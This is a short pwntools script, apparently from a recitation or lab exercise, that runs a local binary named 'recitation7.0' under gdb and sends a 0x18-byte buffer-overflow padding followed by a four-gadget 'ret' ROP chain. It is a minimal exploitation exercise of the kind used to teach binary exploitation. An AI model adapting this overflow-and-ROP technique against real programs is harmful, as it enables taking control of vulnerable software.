from pwn import *

context.log_level = "DEBUG"
context.terminal = ["tmux", "splitw", "-f", "-h"]

r = ROP("./recitation7.0")

p = gdb.debug("./recitation7.0", '''
b main
continue
''')

chain = [
    r.ret.address,
    r.ret.address,
    r.ret.address,
    r.ret.address,
]

p.send(b'A' * 0x18 + b"".join([p64(c) for c in chain]))
p.interactive()
